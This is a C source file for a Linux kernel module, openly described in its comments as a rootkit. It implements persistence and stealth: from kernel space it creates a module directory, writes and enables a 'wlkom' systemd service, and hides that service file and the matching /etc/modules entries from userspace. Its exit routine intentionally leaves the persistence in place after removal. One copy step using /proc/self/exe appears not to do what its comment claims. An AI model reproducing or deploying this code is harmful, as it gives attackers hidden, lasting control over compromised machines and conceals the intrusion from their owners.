#include "persist.h"
#include "service_content.h"

#include <linux/fcntl.h>
#include <linux/fs.h>
#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/slab.h>
#include <linux/uaccess.h>

#include "hide.h"

#define WLKOM_SERVICE_PATH "/etc/systemd/system/wlkom.service"
#define WLKOM_MODULE_DIR   "/lib/modules/wlkom"
#define WLKOM_MODULE_PATH  "/lib/modules/wlkom/wlkom.ko"
#define WLKOM_SERVICE_NAME "wlkom.service"

/**
 * @brief Writes content to a file, creating or truncating it.
 * @param path     Absolute path of the destination file.
 * @param content  Data to write.
 * @param len      Number of bytes to write.
 * @return 0 on success, negative error code on failure.
 */
static int write_file(const char *path, const char *content, size_t len)
{
    struct file *f;
    loff_t       pos;

    f = filp_open(path, O_WRONLY | O_CREAT | O_TRUNC, 0644);
    if (IS_ERR(f))
        return PTR_ERR(f);
    pos = 0;
    kernel_write(f, content, len, &pos);
    filp_close(f, NULL);
    return 0;
}

/**
 * @brief Runs a shell command via usermodehelper (fire and forget).
 * @param cmd  Shell command string to execute.
 */
static void run_cmd(const char *cmd)
{
    char *argv[] = { "/bin/sh", "-c", (char *)cmd, NULL };
    char *envp[] = { "HOME=/",
                     "PATH=/sbin:/bin:/usr/sbin:/usr/bin:/usr/local/sbin",
                     NULL };

    call_usermodehelper(argv[0], argv, envp, UMH_WAIT_PROC);
}

/**
 * @brief Installs the rootkit as a systemd service and hides its traces.
 *        Copies the .ko to WLKOM_MODULE_PATH, writes the service unit,
 *        enables it via systemctl, then hides the service file and
 *        any "wlkom" entries in /etc/modules from userspace reads.
 * @return 0 on success, negative error code if the service file cannot be written.
 */
int persist_init(void)
{
    int ret;

    run_cmd("mkdir -p " WLKOM_MODULE_DIR);
    run_cmd("cp /proc/self/exe " WLKOM_MODULE_PATH " 2>/dev/null || true");

    ret = write_file(WLKOM_SERVICE_PATH, service_content,
                     sizeof(service_content) - 1);
    if (ret < 0)
        return ret;

    run_cmd("systemctl daemon-reload");
    run_cmd("systemctl enable wlkom.service");

    hide_file(WLKOM_SERVICE_NAME);
    hide_file("wlkom");
    hide_line("/etc/modules", "wlkom");

    return 0;
}

/**
 * @brief No-op: persistence is intentionally not undone on rmmod.
 */
void persist_exit(void)
{
}
